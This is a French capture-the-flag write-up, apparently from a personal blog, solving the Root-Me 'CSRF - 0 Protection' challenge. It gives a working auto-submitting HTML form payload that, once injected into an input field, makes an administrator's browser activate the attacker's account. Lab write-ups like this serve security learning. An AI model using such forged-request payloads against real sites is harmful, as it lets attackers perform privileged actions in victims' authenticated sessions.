---
title: 'CSRF - 0 Protection'
description: "Exploitation d'une vulnérabilité CSRF pour activer un compte automatiquement"
pubDate: 'Jul 1 2025'
heroImage: '/src/assets/root_me/rootme13-0.png'
---

## 11. CSRF - 0 Protection

**Objectif :** Activer votre compte pour accéder à l'espace privé de l'intranet  
**Méthode :** Injection d'un formulaire HTML avec auto-soumission  
**Outils utilisés :** Code HTML (Form)  
**Temps :** 25 minutes  


### Solution

Exploitation d'une vulnérabilité CSRF pour activer un compte automatiquement.

![Challenge CSRF](/src/assets/root_me/rootme13-0.png)

**Étapes :**
1. Analyser la requête légitime de modification de profil
2. Créer un formulaire malveillant qui reproduit cette requête
3. Injecter le code dans un champ de saisie :
   ```html
   <form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
     <input type="text" name="username" value="fanny" />
     <input type="checkbox" name="status" checked=checked />
     <input type="submit" value="Submit request" />
   </form>
   <script>document.csrf.submit()</script>
   ```
4. Le formulaire se soumet automatiquement côté administrateur
5. Le compte est activé via la requête CSRF


![Challenge CSRF](/src/assets/root_me/rootme13-2.png)

